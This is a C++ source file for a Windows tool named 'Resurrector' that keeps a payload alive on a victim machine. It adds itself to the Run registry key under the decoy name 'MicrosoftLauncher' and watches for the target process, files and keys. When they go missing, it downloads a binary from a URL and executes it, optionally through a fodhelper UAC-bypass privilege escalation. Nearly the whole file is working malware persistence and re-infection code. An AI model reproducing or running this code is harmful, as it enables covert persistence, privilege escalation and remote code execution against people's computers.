#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include <vector>
#include <fstream>
#include <curl/curl.h>

/*
    Arguments:
        -f <filepath> : File Path of the Binary (not null)
        -p <process name> : Process Name (not null)
        -url <url> : URL To download the 
        -r <registry key> : Registry Keys, can be multiple separated by comma (optional)
        -files <files> : Other files, if one of two of this files is not found, the process will resurrected, can be multiple separated by comma (optional)
        -l <limit> : Limit of the counter, if the counter is greater or equal to the limit, the process will resurrected (optional)
		-admin : Run the process as admin (optional) (More Possibilities to become detected) (can fail in some systems!)
        -h : Help
*/

using namespace std;

bool runProcAsAdminFromUser(string procName) {
    HKEY hkey;
    DWORD d;
    const char* settings = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const char* del = "";
    bool success = false;

    // Attempt to open or create the registry key
    LSTATUS stat = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCWSTR)settings, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d);
    if (stat != ERROR_SUCCESS) {
        cout << "Failed to open or create reg key\n";
        return success;
    }

    // Set the registry values (command and DelegateExecute)
    stat = RegSetValueEx(hkey, L"", 0, REG_SZ, (unsigned char*)procName.c_str(), strlen(procName.c_str()));
    if (stat != ERROR_SUCCESS) {
        cout << "Failed to set reg value\n";
        return success;
    }

    // Set the DelegateExecute value to an empty string
    stat = RegSetValueEx(hkey, L"DelegateExecute", 0, REG_SZ, (unsigned char*)del, strlen(del));
    if (stat != ERROR_SUCCESS) {
        cout << "Failed to set reg value: DelegateExecute\n";
        return success;
    }

    // Close the key handle
    RegCloseKey(hkey);

    SHELLEXECUTEINFO sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    sei.hwnd = NULL;
    sei.nShow = SW_NORMAL;

    // Start the fodhelper.exe program with elevated privileges
    if (!ShellExecuteEx(&sei)) {
        DWORD err = GetLastError();
        printf(err == ERROR_CANCELLED ? "The user refused to allow privilege elevation.\n" : "Unexpected error! Error code: %ld\n", err);
    }
    else {
        printf("Successfully created process =^..^=\n");
    }
    success = true;
    return success;
}


int persistenceViaRunKeys(const char* exe) {
    HKEY hkey = NULL;
    LONG res = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        DWORD dataSize = 0;
        res = RegQueryValueExW(hkey, L"MicrosoftLauncher", NULL, NULL, NULL, &dataSize);
        if (res != ERROR_SUCCESS) {
            wchar_t* wide_exe = NULL;
            int wide_len = MultiByteToWideChar(CP_UTF8, 0, exe, -1, NULL, 0);
            wide_exe = new wchar_t[wide_len];
            MultiByteToWideChar(CP_UTF8, 0, exe, -1, wide_exe, wide_len);
            RegSetValueExW(hkey, L"MicrosoftLauncher", 0, REG_SZ, (BYTE*)wide_exe, (wide_len + 1) * sizeof(wchar_t));
            delete[] wide_exe;
        }
        RegCloseKey(hkey);
    }
    return 0;
}


bool isProcessRunning(wstring processName) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return false;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return false;
    }
    do {
        if (processName.compare(pe32.szExeFile) == 0) {
            CloseHandle(hProcessSnap);
            return true;
        }
    } while (Process32Next(hProcessSnap, &pe32));
    CloseHandle(hProcessSnap);
    return false;
}

bool existsFile(string filePath) {
    DWORD dwAttrib = GetFileAttributesA(filePath.c_str());
    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

bool existsRegistryKey(const std::string& registryKey) {
    HKEY hKey;
    std::wstring wRegistryKey(registryKey.begin(), registryKey.end()); 

    LONG lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, wRegistryKey.c_str(), 0, KEY_READ, &hKey);
    if (lResult == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

size_t WriteCallback(void* ptr, size_t size, size_t nmemb, FILE* stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

int downloadBinary(string url, string filePath) {
	// download the binary from the URL
    CURL* curl;
    FILE* fp;
    CURLcode res;

    curl = curl_easy_init();
    if (curl) {
        fp = fopen(filePath.c_str(), "wb");
        if (!fp) {
            std::cerr << "Error: No se pudo abrir el archivo para escribir.\n";
            return 1;
        }

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);

        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "Error en la solicitud: " << curl_easy_strerror(res) << "\n";
            fclose(fp);
            curl_easy_cleanup(curl);
            return 1;
        }

        fclose(fp);

        curl_easy_cleanup(curl);
        return 0; 
    }

    std::cerr << "Error: No se pudo inicializar curl.\n";
    return 1;
}

int main(int argc, char* argv[])
{
    if (argc < 2) {
		cout << "Usage: Resurrector.exe -f <filepath> -p <process name> -url <URL> [-r <registry key>] [-files <files>] [-l <limit>] [-admin] [-h <help>]" << endl;
		cout << "Use -h for help" << endl;
        return 1;
    }


    string filePath = "";
    string processName = "";
    string url = "";
    vector<string> registryKeys;
    vector<string> files;
    bool admin = false;
    int counter = 0;
	int countLimit = -1;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-f") == 0) {
            filePath = argv[i + 1];
        }
        else if (strcmp(argv[i], "-p") == 0) {
            processName = argv[i + 1];
        }
        else if (strcmp(argv[i], "-r") == 0) {
            string registryKey = argv[i + 1];
            // split the registry keys by comma
            size_t pos = 0;
            string token;
            while ((pos = registryKey.find(",")) != string::npos) {
                token = registryKey.substr(0, pos);
                registryKeys.push_back(token);
                registryKey.erase(0, pos + 1);
            }
            registryKeys.push_back(registryKey); // Add the last registry key
        }
        else if (strcmp(argv[i], "-files") == 0) {
            string file = argv[i + 1];
            // split the files by comma
            size_t pos = 0;
            string token;
            while ((pos = file.find(",")) != string::npos) {
                token = file.substr(0, pos);
                files.push_back(token);
                file.erase(0, pos + 1);
            }
            files.push_back(file); // Add the last file
        }
        else if (strcmp(argv[i], "-h") == 0) {
			cout << "Usage: Resurrector.exe -f <filepath> -p <process name> [-r <registry key>] [-files <files>] [-l <limit>] [-h <help>]" << endl;
			cout << "\nArguments:" << endl;
			cout << "    -f <filepath> : File Path of the Binary (not null)" << endl;
			cout << "    -p <process name> : Process Name (not null)" << endl;
			cout << "    -url <url> : URL To download the binary (not null)" << endl;
			cout << "    -r <registry key> : Registry Keys, can be multiple separated by comma (optional)" << endl;
			cout << "    -files <files> : Other files, if one of two of this files is not found, the process will resurrected, can be multiple separated by comma (optional)" << endl;
			cout << "    -l <limit> : Limit of the counter, if the counter is greater or equal to the limit, the process will resurrected (optional)" << endl;
			cout << "    -admin : Run the process as admin (optional) (More Possibilities to become detected) ([!]can fail in some systems!)" << endl;
			cout << "    -h : Help" << endl;
            return 0;
        }
        else if (strcmp(argv[i], "-l") == 0) {
            countLimit = atoi(argv[i + 1]);
        }
		else if (strcmp(argv[i], "-admin") == 0) {
			admin = true;
		}
		else if (strcmp(argv[i], "-url") == 0) {
			url = argv[i + 1];
		}
    }

	if (countLimit == -1) {
		countLimit = 3;
	}

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
	// create the persistence via Run Keys with this current executable
	// get the complete command to run the current executable

    string completeCommand = path;
	for (int i = 1; i < argc; i++) {
		completeCommand += " ";
		completeCommand += argv[i];
	}
	cout << "Complete Command: " << completeCommand << endl;
	char* cCompleteCommand = new char[completeCommand.size() + 1];
	strcpy(cCompleteCommand, completeCommand.c_str());
    persistenceViaRunKeys(cCompleteCommand);

    cout << "File Path: " << filePath << endl;
    cout << "Process Name: " << processName << endl;
	cout << "URL: " << url << endl;
	cout << "Admin: " << admin << endl;
    cout << "Registry Keys: ";
    for (string registryKey : registryKeys) {
        cout << registryKey << " ";
    }
    cout << endl;
    cout << "Files: ";
    for (string file : files) {
        cout << file << " ";
    }
    cout << endl;

    // if the paths or registry keys have '/' replace it with '\\'
    for (int i = 0; i < filePath.size(); i++) {
        if (filePath[i] == '/') {
            filePath[i] = '\\';
        }
    }

    for (int i = 0; i < files.size(); i++) {
        for (char& c : files[i]) {
            if (c == '/') {
                c = '\\';
            }
        }
    }

    for (int i = 0; i < registryKeys.size(); i++) {
        for (char& c : registryKeys[i]) {
            if (c == '/') {
                c = '\\';
            }
        }
    }

    cout << "\n[!] Resurrector Detector started" << endl;
    cout << "[+] Results:" << endl;

    // check if the process is running	
    if (isProcessRunning(wstring(processName.begin(), processName.end()))) {
        cout << "Process is running" << endl;
    }
    else {
        cout << "Process is not running" << endl;
        counter++;
    }

    // check if the files are in their paths
    for (string file : files) {
        if (existsFile(file)) {
            cout << "File " << file << " exists" << endl;
        }
        else {
            cout << "File " << file << " does not exist" << endl;
            counter++;
        }
    }

    // check if the binary is in the path
    if (existsFile(filePath)) {
        cout << "Binary exists" << endl;
    }
    else {
        cout << "Binary does not exist" << endl;
        counter = counter + 2;
    }

    // check if the registry keys are in the registry
    for (string registryKey : registryKeys) {
        if (existsRegistryKey(registryKey)) {
            cout << "Registry Key " << registryKey << " exists" << endl;
        }
        else {
            cout << "Registry Key " << registryKey << " does not exist" << endl;
            counter++;
        }
    }

	cout << "\n[!] Counter: " << counter << endl;
	cout << "[!] Count Limit: " << countLimit << endl;

    if (counter > countLimit) {
        cout << "Resurrecting process" << endl;
		// download and execute the binary from the URL
		downloadBinary(url, filePath);
        if (admin) {
            runProcAsAdminFromUser(filePath);
		}
		else {
			ShellExecuteA(NULL, "open", filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
		}
    }
    else {
        cout << "Not resurrecting process" << endl;
    }

    return 0;
}
